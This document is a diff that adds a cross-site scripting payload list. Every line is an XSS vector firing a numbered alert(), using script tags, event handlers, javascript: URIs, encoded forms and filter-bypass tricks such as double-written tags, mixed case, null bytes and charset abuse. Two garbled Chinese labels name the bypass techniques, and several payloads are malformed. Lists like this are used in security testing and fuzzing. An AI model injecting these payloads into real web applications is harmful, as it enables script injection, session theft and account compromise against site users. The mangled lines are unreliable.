@@ -1,0 +1,89 @@
+<script>alert(1)</script>
+medium--> Ë«Ð´ÈÆ¹ý£º<sc<script>ript>alert(4)</script>
+´óÐ¡Ð´»ìÏýÈÆ¹ý£º<ScRipt>alert(5)</script>
+<img src=1 onerror=alert(7)>
+onmouseover=¡¯alert(9)¡¯
+<script>alert(11);</script> 
+>"'><img src="javascript.:alert(12)">
+>"'><script>alert(13)</script>
+<table background='javascript.:alert(14)'></table>
+<object type=text/html data='javascript.:alert(15);'></object>
+"+alert(16)+"
+<body/onfocus=top.alert(17)>
+<img/src=22 onerror=window.alert(22)>
+<img src=66 onerror=~function(){alert(66)}()>
+<a href="javascript:`${alert(69)}`">XSS Test</a>
+<a href="javascript:[''].findIndex(alert(71)">XSS Test</a>
+<iframe onload=location=['javascript:alert(79)'].join(")>
+<a href="javascript:(new Function('alert(80))()">XSS Test</a>
+<body/onload=Function(alert(81))()>
+<img%0Dsrc=82 onerror=Function(alert(82))>
+<a href="javascript:(new (Object.getPrototypeOf(async function(){}).constructor)('alert(84))()">XSS Test</a>
+<body/onload=eval(location.hash.slice(85))>#alert(85)
+<svg/onload=alert(91)
+<svg/onload="javascript:alert(103)" xmlns="http://www.baidu.com">
+<body onload=alert(140)>
+%0a%0a<script>alert(227)</script>.jsp
+%3c/a%3e%3cscript%3ealert(228)%3c/script%3e
+%3c/title%3e%3cscript%3ealert(229)%3c/script%3e
+%3cscript%3ealert(230)%3c/script%3e/index.html
+<script>alert(231)</script>
+a.jsp/<script>alert(232)</script>
+"><script>alert(233)</script>
+<IMG SRC="javascript.:alert(234);">
+"<IMG src="/java"\0script.:alert(241)>";'>out
+<IMG SRC=" javascript.:alert(242);">
+<SCRIPT>a=/XSS/alert(243)</SCRIPT>
+'`"><\x3Cscript>javascript:alert(285)</script>
+<img src=287 href=287 onerror="javascript:alert(287)"></img>
+<svg onResize svg onResize="javascript:javascript:alert(294)"></svg onResize>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(295)"></title onPropertyChange>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(296)"></iframe onLoad>
+<script charset="\x22>javascript:alert(357)</script>
+<!--\x3E<img src=xxx:x onerror=javascript:alert(358)> -->
+`"'><img src='#\x27 onerror=javascript:alert(363)>
+<a href="javascript\x3Ajavascript:alert(364)" id="fuzzelement364">test</a>
+"'`><p><svg><script>a='hello\x27;javascript:alert(365)//';</script></p>
+<a href="javas\x00cript:javascript:alert(366)" id="fuzzelement366">test</a>
+'`"><\x3Cscript>javascript:alert(392)</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(650)}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(651)')()</script>
+<meta charset="mac-farsi">¼script¾javascript:alert(652)¼/script¾
+X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(653)` >
+&lt;&lt;SCRIPT&gt;alert(917);//&lt;&lt;/SCRIPT&gt;
+&lt;IMG SRC=\"javascript&#058;alert(932);\"&gt;
+';alert(933))//\';alert(933))//\";alert(933))//\\";alert(933))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(933))&lt;/SCRIPT&gt;
+<IMG SRC=" &#14;  javascript:alert(940);">
+<<SCRIPT>alert(941);//<</SCRIPT>
+<SCRIPT>a=/XSS/alert(942)</SCRIPT>
+\";alert(943);//
+</TITLE><SCRIPT>alert(944);</SCRIPT>
+¼script¾alert(945)¼/script¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(946);">
+<IFRAME SRC="javascript:alert(947);"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert(948);"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert(949)">
+exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(956))'>
+<IMG SRC=javascript:alert(1728))>
+"><script>alert(1729)</script>
+</title><script>alert(1730)</script>
+</textarea><script>alert(1731)</script>
+<IMG LOWSRC=\"javascript:alert(1732)\">
+<IMG DYNSRC=\"javascript:alert(1733)\">
+<font style='color:expression(alert(1734))'>
+<img src="javascript:alert(1735)">
+<script language="JavaScript">alert(1736)</script>
+<body onunload="javascript:alert(1737);">
+<body onLoad="alert(1738);"
+[color=red' onmouseover="alert(1739)"]mouse over[/color]
+"/></a></><img src=1740.gif onerror=alert(1740)>
+window.alert(1741);
+<iframe<?php echo chr(11)?> onload=alert(1743)></iframe>
+"><script alert(1744))</script>
+'">><script>alert(1745)</script>
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(1746);\">
+&apos;;alert(1804))//\&apos;;alert(1804))//&quot;;alert(1804))//\&quot;;alert(1804))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(1804))&lt;/SCRIPT&gt;
+&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(1858)&gt;
+&lt;/script&gt;&lt;script&gt;alert(1859)&lt;/script&gt;
+perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(1864)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out
+<;<;SCRIPT>;alert(1925);//<;<;/SCRIPT>;
